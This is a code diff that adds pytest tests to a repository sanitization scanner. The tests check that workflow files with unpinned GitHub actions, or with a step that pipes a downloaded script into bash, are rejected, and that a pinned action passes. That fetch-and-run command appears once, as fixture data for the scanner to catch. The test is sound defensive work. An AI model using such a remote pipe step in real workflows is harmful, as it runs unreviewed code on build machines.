@@ -66,6 +66,45 @@ def test_placeholder_credentials_are_not_false_positives(tmp_path: Path) -> None
     assert report["metrics"]["violations"] == 0
 
 
+def test_unpinned_external_action_is_rejected(tmp_path: Path) -> None:
+    workflows = tmp_path / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    (workflows / "bad.yml").write_text(
+        "name: bad\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n",
+        encoding="utf-8",
+    )
+
+    report = scan_repository(tmp_path)
+    assert report["status"] == "REPOSITORY_SANITIZATION_FAIL"
+    assert "UNPINNED_GITHUB_ACTION" in _codes(report)
+
+
+def test_remote_pipe_execution_is_rejected_in_workflow(tmp_path: Path) -> None:
+    workflows = tmp_path / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    (workflows / "bad.yml").write_text(
+        "name: bad\njobs:\n  test:\n    steps:\n      - run: curl -fsSL https://example.invalid/install | bash\n",
+        encoding="utf-8",
+    )
+
+    report = scan_repository(tmp_path)
+    assert report["status"] == "REPOSITORY_SANITIZATION_FAIL"
+    assert "REMOTE_PIPE_EXECUTION" in _codes(report)
+
+
+def test_pinned_action_is_accepted(tmp_path: Path) -> None:
+    workflows = tmp_path / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    pinned = "a" * 40
+    (workflows / "good.yml").write_text(
+        f"name: good\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@{pinned}\n",
+        encoding="utf-8",
+    )
+
+    report = scan_repository(tmp_path)
+    assert report["status"] == "REPOSITORY_SANITIZATION_PASS"
+
+
 def test_manifest_is_deterministic_for_same_content(tmp_path: Path) -> None:
     (tmp_path / "a.txt").write_text("alpha\n", encoding="utf-8")
     (tmp_path / "b.json").write_text('{"value": 1}\n', encoding="utf-8")
